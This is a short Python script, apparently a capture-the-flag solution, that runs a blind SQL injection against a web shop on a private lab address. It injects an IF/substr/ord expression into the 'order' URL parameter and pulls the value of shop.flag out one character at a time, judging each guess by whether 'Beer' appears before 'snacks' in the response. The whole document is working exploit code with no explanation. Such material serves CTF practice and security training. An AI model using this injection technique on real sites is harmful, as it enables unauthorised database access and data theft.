import requests
url = "http://10.51.0.7"
flag = ""
for i in range(38):
    for j in range(48,127):
        payload = "/?order=IF(ord(substr((select flag from shop.flag),"+str(i)+",1))LIKE(" +str(j) + "),price,id)"
        content = requests.get(url=url+payload)
        if content.text.find("Beer") < content.text.find("snacks"):
            flag = flag + chr(j)
    print(flag)
